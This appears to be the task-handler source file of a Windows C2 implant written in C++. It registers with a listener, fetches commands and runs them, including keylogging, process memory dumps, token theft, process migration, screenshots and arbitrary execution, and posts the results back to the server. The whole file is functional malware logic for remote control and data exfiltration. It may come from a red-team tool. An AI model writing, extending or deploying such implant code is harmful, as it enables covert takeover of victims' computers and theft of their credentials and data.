#include "core/handler.hpp"

namespace Handler
{
    std::wstring GetInitialInfo()
    {
        std::wstring wOS = L"windows";
        std::wstring wArch = L"";
        std::wstring wHostname = L"";
        std::wstring wListenerURL = L"";
        std::wstring wImplantType = PAYLOAD_TYPE_W;
        std::wstring wSleep = Utils::Convert::UTF8Decode(std::to_string(PAYLOAD_SLEEP));
        std::wstring wJitter = Utils::Convert::UTF8Decode(std::to_string(PAYLOAD_JITTER));
        std::wstring wKillDate = Utils::Convert::UTF8Decode(std::to_string(PAYLOAD_KILLDATE));

        // Get listener URL
        wListenerURL += LISTENER_PROTOCOL_W;
        wListenerURL += L"://";
        wListenerURL +=	LISTENER_HOST_W;
        wListenerURL +=	L":";
        wListenerURL +=	Utils::Convert::UTF8Decode(std::to_string(LISTENER_PORT));

        // Get architecture
        SYSTEM_INFO systemInfo;
        GetSystemInfo(&systemInfo);
        wArch = System::Arch::GetName(systemInfo.wProcessorArchitecture);

        // Get hostname and convert it to wstring
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2,2), &wsaData) == 0) 
        {
            char szHostname[256] = "";
            gethostname(szHostname, 256);
            std::string sHostname(szHostname);
            wHostname = Utils::Convert::UTF8Decode(sHostname);
        }

        std::wstring wJson = L"{";
        wJson += L"\"os\":\"" + wOS + L"\"";
        wJson += L",";
        wJson += L"\"arch\":\"" + wArch + L"\"";
        wJson += L",";
        wJson += L"\"hostname\":\"" + wHostname + L"\"";
        wJson += L",";
        wJson += L"\"listenerURL\":\"" + wListenerURL + L"\"";
        wJson += L",";
        wJson += L"\"implantType\":\"" + wImplantType + L"\"";
        wJson += L",";
        wJson += L"\"sleep\":" + wSleep + L"";
        wJson += L",";
        wJson += L"\"jitter\":" + wJitter + L"";
        wJson += L",";
        wJson += L"\"killDate\":" + wKillDate + L"";
        wJson += L"}";

        return wJson;
    }

    BOOL CheckIn(
        HINTERNET hConnect,
        LPCWSTR lpHost,
        INTERNET_PORT nPort,
        LPCWSTR lpPath,
        const std::wstring& wInfoJson
    ) {
        std::string sInfoJson = Utils::Convert::UTF8Encode(wInfoJson);

        System::Http::WinHttpResponse resp = System::Http::SendRequest(
            hConnect,
            lpHost,
            nPort,
            lpPath,
            L"POST",
            L"Content-Type: application/json\r\n",
            (LPVOID)sInfoJson.c_str(),
            (DWORD)strlen(sInfoJson.c_str())
        );
        if (!resp.bResult || resp.dwStatusCode != 200)
        {
            return FALSE;
        }
        return TRUE;
    }

    std::wstring GetTask(
        HINTERNET hConnect,
        LPCWSTR lpHost,
        INTERNET_PORT nPort,
        LPCWSTR lpPath
    ) {
        std::wstring task;
        HINTERNET hRequest = NULL;

        System::Http::WinHttpResponse resp = System::Http::SendRequest(
            hConnect,
            lpHost,
            nPort,
            lpPath,
            L"GET",
            NULL,
            NULL,
            0
        );
        if (!resp.bResult || resp.dwStatusCode != 200)
        {
            return task;
        }

        hRequest = resp.hRequest;

        task = System::Http::ReadResponseText(hRequest);
        return task;
    }

    std::wstring ExecuteTask(
        HINSTANCE hInstance,
        INT nCmdShow,
        HINTERNET hConnect,
        const std::wstring& task,
        INT &nSleep
    ) {
        // If no task, return immediatly.
        if (wcscmp(task.substr(0, 4).c_str(), L"cat ") == 0)
        {
            return Task::Cat(task.substr(4, task.size()));
        }
        else if (wcscmp(task.substr(0, 3).c_str(), L"cd ") == 0)
        {
            return Task::Cd(task.substr(3, task.size()));
        }
        else if (wcscmp(task.substr(0, 3).c_str(), L"cp ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::SplitW(task, L' ');
            if (wArgs.size() != 3)
            {
                return L"Error: Invalid argument.";
            }
            return Task::Cp(wArgs[1], wArgs[2]);
        }
        else if (wcscmp(task.substr(0, 9).c_str(), L"download ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::SplitW(task, L' ');
            if (wArgs.size() != 3)
            {
                return L"Error: Invalid argument.";
            }
            return Task::Download(hConnect, wArgs[1], wArgs[2]);
        }
        else if (wcscmp(task.substr(0, 8).c_str(), L"execute ") == 0)
        {
            return Task::Execute(task.substr(8, task.size()));
        }
        else if (wcscmp(task.substr(0, 2).c_str(), L"ip") == 0)
        {
            return Task::Ip();
        }
        else if (wcscmp(task.substr(0, 7).c_str(), L"keylog ") == 0)
        {
            return Task::KeyLog(task.substr(7, task.size()));
        }
        else if (wcscmp(task.c_str(), L"kill") == 0)
        {
            return Task::Kill();
        }
        else if (wcscmp(task.substr(0, 3).c_str(), L"ls ") == 0)
        {
            return Task::Ls(task.substr(3, task.size()));
        }
        else if (wcscmp(task.substr(0, 8).c_str(), L"migrate ") == 0)
        {
            return Task::Migrate(task.substr(8, task.size()));
        }
        else if (wcscmp(task.substr(0, 6).c_str(), L"mkdir ") == 0)
        {
            return Task::Mkdir(task.substr(6, task.size()));
        }
        else if (wcscmp(task.substr(0, 3).c_str(), L"mv ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::SplitW(task, L' ');
            if (wArgs.size() != 3)
            {
                return L"Error: Invalid argument.";
            }
            return Task::Mv(wArgs[1], wArgs[2]);
        }
        else if (wcscmp(task.c_str(), L"net") == 0)
        {
            return Task::Net();
        }
        else if (wcscmp(task.substr(0, 9).c_str(), L"procdump ") == 0)
        {
            return Task::Procdump(task.substr(9, task.size()));
        }
        else if (wcscmp(task.c_str(), L"ps") == 0)
        {
            return Task::Ps();
        }
        else if (wcscmp(task.substr(0, 8).c_str(), L"ps kill ") == 0)
        {
            return Task::PsKill(task.substr(8, task.size()));
        }
        else if (wcscmp(task.c_str(), L"pwd") == 0)
        {
            return Task::Pwd();
        }
        else if (wcscmp(task.substr(0, 12).c_str(), L"reg subkeys ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::SplitW(task, L' ');
            if (wArgs.size() < 5)
            {
                return L"Error: Invalid argument.";
            }
            BOOL bRecurse = wArgs[2] == L"true";
            std::wstring wRootKey = wArgs[3];
            std::wstring wSubKey;
            for (size_t i = 4; i < wArgs.size(); i++)
            {
                wSubKey += wArgs[i];
            }
            return Task::RegSubKeys(wRootKey, wSubKey, bRecurse);
        }
        else if (wcscmp(task.substr(0, 11).c_str(), L"reg values ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::SplitW(task, L' ');
            if (wArgs.size() < 5)
            {
                return L"Error: Invalid argument.";
            }
            BOOL bRecurse = wArgs[2] == L"true";
            std::wstring wRootKey = wArgs[3];
            std::wstring wSubKey;
            for (size_t i = 4; i < wArgs.size(); i++)
            {
                wSubKey += wArgs[i];
            }
            return Task::RegValues(wRootKey, wSubKey, bRecurse);
        }
        else if (wcscmp(task.substr(0, 3).c_str(), L"rm ") == 0)
        {
            return Task::Rm(task.substr(3, task.size()));
        }
        else if (wcscmp(task.substr(0, 6).c_str(), L"rmdir ") == 0)
        {
            return Task::Rmdir(task.substr(6, task.size()));
        }
        else if (wcscmp(task.c_str(), L"screenshot") == 0)
        {
            #ifndef IS_DLL
            return Task::Screenshot(hInstance, nCmdShow);
            #else
            return L"Error: Cannot take a screenshot on DLL.";
            #endif
        }
        else if (wcscmp(task.substr(0, 6).c_str(), L"sleep ") == 0)
        {
            return Task::Sleep(task.substr(6, task.size()), nSleep);
        }
        else if (wcscmp(task.c_str(), L"token revert") == 0)
        {
            return Task::TokenRevert();
        }
        else if (wcscmp(task.substr(0, 12).c_str(), L"token steal ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::SplitW(task, L' ');
            if (wArgs.size() != 4)
            {
                return L"Error: Invalid argument.";
            }
            return Task::TokenSteal(wArgs[2], wArgs[3]);
        }
        else if (wcscmp(task.substr(0, 7).c_str(), L"upload ") == 0)
        {
            // Parse arguments.
            std::vector<std::wstring> wArgs = Utils::Split::SplitW(task, L' ');
            if (wArgs.size() != 3)
            {
                return L"Error: Invalid argument.";
            }
            return Task::Upload(hConnect, wArgs[1], wArgs[2]);
        }
        else if (wcscmp(task.c_str(), L"whoami") == 0)
        {
            return Task::Whoami();
        }
        else if (wcscmp(task.c_str(), L"whoami priv") == 0)
        {
            return Task::WhoamiPriv();
        }
        else
        {
            return L"Error: Invalid task.";
        }
    }

    BOOL SendTaskResult(
        HINTERNET hConnect,
        LPCWSTR lpHost,
        INTERNET_PORT nPort,
        LPCWSTR lpPath,
        const std::wstring& task,
        const std::wstring& taskResult
    ) {
        System::Http::WinHttpResponse resp;

        if (wcscmp(taskResult.c_str(), L"") == 0) {
            return FALSE;
        }

        // Prepare additional headers
        std::wstring wHeaders;
        wHeaders = L"X-Task: " + task + L"\r\n";

        // When the "procdump" and "screenshot" tasks,
        // read bytes of the captured image file and send them.
        if (
            (wcscmp(task.substr(0, 9).c_str(), L"procdump ") == 0) ||
            (wcscmp(task.c_str(), L"screenshot") == 0)
        ) {
            // Load a captured image file
            std::vector<char> fileData = System::Fs::ReadBytesFromFile(taskResult);

            // Delete the image file
            DeleteFile(taskResult.c_str());

            resp = System::Http::SendRequest(
                hConnect,
                lpHost,
                nPort,
                lpPath,
                L"POST",
                wHeaders.c_str(),
                (LPVOID)fileData.data(),
                (DWORD)fileData.size()
            );
        }
        else
        {
            // I couln't retrieve the `wstring` length correctly, so use `string` here.
            std::string sTaskResult = Utils::Convert::UTF8Encode(taskResult);

            resp = System::Http::SendRequest(
                hConnect,
                lpHost,
                nPort,
                lpPath,
                L"POST",
                wHeaders.c_str(),
                (LPVOID)sTaskResult.c_str(),
                (DWORD)strlen(sTaskResult.c_str())
            );
        }


        if (!resp.bResult || resp.dwStatusCode != 200)
        {
            return FALSE;
        }

        return TRUE;
    }
}


